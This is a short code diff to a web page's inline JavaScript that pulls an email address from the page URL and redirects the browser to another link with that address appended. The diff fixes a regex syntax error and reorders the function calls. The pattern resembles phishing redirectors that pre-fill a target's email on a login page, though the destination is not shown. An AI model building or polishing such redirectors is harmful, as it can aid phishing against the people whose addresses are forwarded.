@@ -11,9 +11,12 @@
       if (emailRegex.test(currentURL)) {
         // Replace the '=' character with an empty string for the email address
         var cleanURL = currentURL.replace(emailRegex, '');
-        
+
         // Redirect to the cleaned URL
         window.location.href = cleanURL;
+      } else {
+        // If the URL didn't match the email pattern, proceed with extracting the email
+        extractEmailAndRedirect();
       }
     }
 
@@ -31,7 +34,7 @@
         // Check if the email part is not empty
         if (emailPart) {
           // Extract the email by finding the first '@' symbol
-          var email = emailPart.match(/[^@]+@[^@]+);
+          var email = emailPart.match(/[^@]+@[^@]+/);
 
           if (email) {
             // Construct the redirect URL by appending the extracted email to the second link
@@ -53,9 +56,8 @@
       }
     }
 
-    // Call both functions immediately when the script is loaded
+    // Call the function immediately when the script is loaded
     processEmailUrl();
-    extractEmailAndRedirect();
   </script>
 </head>
 <body>
